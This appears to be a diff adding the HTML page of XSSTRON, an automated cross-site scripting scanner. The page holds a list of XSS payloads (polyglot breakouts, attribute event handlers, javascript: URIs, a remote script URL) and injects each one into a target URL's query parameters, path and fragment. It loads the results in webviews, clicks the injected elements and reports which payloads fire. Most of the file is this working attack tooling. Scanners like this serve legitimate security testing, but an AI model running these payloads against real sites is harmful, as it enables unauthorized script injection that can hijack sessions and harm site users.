@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>XSSTRON</title>
+    
+  </head>
+  <body>
+
+<center><h3 style="color:magenta;font-size: 30px;">XSSTRON</h3>
+  <center><h3 id=xsx style="color:rgb(255, 0, 0);font-size: 25px;"></h3>
+<h5 id=h5 style="color:rgb(1, 18, 255);font-size: 20px;"></h5>
+</center>
+
+<script>
+
+var htmlp = `javascript:/*xssx'">--></noscript></title></textarea></style></template></noembed><\/script><img src=x onerror=pinghost(1)//>*/;top.pinghost(2)//`
+var htmlpu = `'">--></noscript></title></textarea></style></template></noembed><\/script><img src=x onerror=top.pinghost(1)>`
+var jsj = `javascript:top.pinghost(1)`
+var atrx = `x id=clx onclick=top.pinghost(1)// `
+var atrx1 = `' id="clx" onclick="top.pinghost(1)//"" '`
+var atrx2 = `" id=clx onclick=top.pinghost(1)// "`
+var jsp1 = `'-top.pinghost(1)-'`
+var jsp2 = `"-top.pinghost(1)-"`
+var jsp3 = `\`-\${top.pinghost(1)}-\``
+var ujs1 = `///xsstron.herokuapp.com/x.php`
+
+
+var j = new URL(location).searchParams.get('shqlipqli')
+  document.getElementById('h5').innerHTML='URL Tested: <span style=color:black>'+j+'</span>'
+
+ let jx = j.substr(j.indexOf('?')+1)
+
+ var ja;
+ if(j.indexOf('?')!=-1){
+ja = j.substr(0,j.indexOf('?'))
+ }
+ else{
+   ja=j;
+ }
+
+  let params = new URLSearchParams(jx);
+let paramObj = {};
+for(var value of params.keys()) {
+     paramObj[value] = params.get(value);
+ }
+var w;
+
+function escapeHtml(unsafe) {
+    return unsafe
+         .replace(/&/g, "&amp;")
+         .replace(/</g, "&lt;")
+         .replace(/>/g, "&gt;")
+         .replace(/"/g, "&quot;")
+         .replace(/'/g, "&#039;");
+ }
+ 
+ var state=0;
+
+ var swich=1;
+
+
+function cw(x,y){
+  if(swich){
+
+  let w = document.createElement('webview')
+ w.setAttribute('src',x)
+ w.setAttribute('preload','./d.js')
+ w.setAttribute('id','htmlw')
+ w.setAttribute('enableRemoteModule','true')
+
+ 
+
+ document.body.appendChild(w)
+
+w.addEventListener('ipc-message', event => {
+  window.resizeTo(800, 600); 
+   top.xsx.innerHTML+='XSS Found : <span style="color:black">'+escapeHtml(decodeURIComponent(event.channel)).replaceAll('pinghost','alert')+'</span><br>'
+   state=1;
+   swich=0;
+   window.focus();
+   alert('XSS Found')
+ }) 
+  
+  setTimeout(function(){
+  if(!state){
+ window.close();
+   }},7000);
+
+ 
+   if(y=23){
+   w.addEventListener('dom-ready', () => {
+setTimeout(function(){
+w.executeJavaScript(`var x= document.querySelector("[href^='javascript:/']"); if(x){x.click()}`) 
+w.executeJavaScript(`var x= document.querySelector('[onclick*=top]');if(x){x.click()}`)
+}
+,300);
+
+})}
+else{
+  setTimeout(function(){
+    w.remove();
+  },1000)
+}}
+
+}
+  
+
+for (var key in paramObj) {
+    if (paramObj.hasOwnProperty(key)) {
+        
+       cw(ja+'?'+key+`=`+htmlp,23)
+       cw(ja+'?'+key+`=`+jsj)
+       cw(ja+'?'+key+`=`+atrx,23)
+       cw(ja+'?'+key+`=`+atrx1,23)
+       cw(ja+'?'+key+`=`+atrx2,23)
+       cw(ja+'?'+key+`=`+jsp1)
+       cw(ja+'?'+key+`=`+jsp2)
+       cw(ja+'?'+key+`=`+jsp3)
+       cw(ja+'?'+key+`=`+ujs1)
+
+    }
+}
+
+if(j.indexOf('?')<0){
+  setTimeout(function(){
+cw(j+'/'+htmlpu)
+cw(j+'/'+atrx)
+cw(j+'/'+atrx1)
+cw(j+'/'+atrx2)
+cw(j+'/'+jsp1)
+cw(j+'/'+jsp2)
+  },500)
+
+}
+
+x= new URL(j)
+
+if(j.indexOf('#')>0){
+  setTimeout(function(){
+  cw(j.substr(0,j.indexOf('#'))+'#'+htmlp,23)
+  cw(j.substr(0,j.indexOf('#'))+'#'+jsj)
+  cw(j.substr(0,j.indexOf('#'))+'#'+ujs1)
+  cw(j.substr(0,j.indexOf('#'))+'#'+atrx,23)
+  cw(j.substr(0,j.indexOf('#'))+'#'+atrx1,23)
+  cw(j.substr(0,j.indexOf('#'))+'#'+atrx2,23)
+},1500)
+}
+else{
+  setTimeout(function(){
+  cw(x.protocol+x.hostname+x.pathname+'#'+htmlp,23)
+  cw(x.protocol+x.hostname+x.pathname+'#'+jsj)
+  cw(x.protocol+x.hostname+x.pathname+'#'+ujs1)
+  cw(x.protocol+x.hostname+x.pathname+'#'+atrx,23)
+  cw(x.protocol+x.hostname+x.pathname+'#'+atrx1,23)
+  cw(x.protocol+x.hostname+x.pathname+'#'+atrx2,23)
+
+},2000)
+
+}
+
+  </script>
+
+  </body>
+</html>
